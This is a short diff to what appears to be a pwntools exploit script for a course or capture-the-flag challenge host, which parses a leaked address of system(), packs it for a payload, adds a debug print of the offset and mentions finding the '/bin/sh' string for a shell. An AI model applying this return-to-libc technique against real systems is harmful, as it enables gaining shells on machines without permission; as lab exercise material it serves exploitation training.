@@ -21,6 +21,7 @@ with remote("csc748.hostbin.org", 7042) as p:
     system_str = "0x" + str(msg)[index:index+16]
     system_offset = int(system_str, 16)
     system = p64(system_offset)
+    print("Target's system offset is {}".format(hex(system_offset)))
 
     """
     A more interesting and dynamic approach to finding the '/bin/sh' string can be done as follows
